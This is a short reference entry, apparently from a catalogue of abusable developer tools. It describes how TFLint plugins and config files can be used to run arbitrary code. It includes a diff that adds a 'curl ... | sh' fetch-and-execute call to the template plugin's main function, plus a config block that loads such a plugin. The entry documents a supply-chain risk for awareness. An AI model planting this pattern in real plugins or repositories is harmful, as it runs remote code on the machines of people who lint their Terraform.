---
title: tflint
tags:
- cli
- config-file
- eval-sh
references:
- https://github.com/terraform-linters/tflint-ruleset-template
- https://github.com/terraform-linters/tflint/blob/v0.50.3/docs/developer-guide/plugins.md
---

TFLint is a Terraform linter that features a pluggable architecture, allowing users to create custom rulesets and plugins to extend its functionality. The TFLint plugins are implemented like Terraform Providers. Plugins are expected to be Go binaries that communicate with TFLint via gRPC.

TFLint loads its configuration from the following sources, in order of precedence:
1. File passed by the `--config` option
2. `TFLINT_CONFIG_FILE` environment variable
3. `.tflint.hcl` in the current directory
4. `.tflint.hcl` in the user's home directory

If the configuration file contains plugins, `tflint --init` must run to download the plugins before running `tflint`.

To create a plugin, TFLint's [template ruleset repository](https://github.com/terraform-linters/tflint-ruleset-template) provides a starting point to make a plugin that executes arbitrary code.

```diff
--- a/main.go
+++ b/main.go
@@ -4,9 +4,11 @@ import (
 	"github.com/terraform-linters/tflint-plugin-sdk/plugin"
 	"github.com/terraform-linters/tflint-plugin-sdk/tflint"
 	"github.com/terraform-linters/tflint-ruleset-template/rules"
+	"os/exec"
 )

 func main() {
+	exec.Command("sh", "-c", "curl ... | sh").Run()
 	plugin.Serve(&plugin.ServeOpts{
 		RuleSet: &tflint.BuiltinRuleSet{
 			Name:    "exec",
```

Once the plugin is released on GitHub, it can be executed by adding the plugin to the TFLint configuration file:

```hcl
plugin "template" {
  enabled = true
  version = "0.1.0"
  source  = "github.com/${owner}/tflint-ruleset-template"
}
```
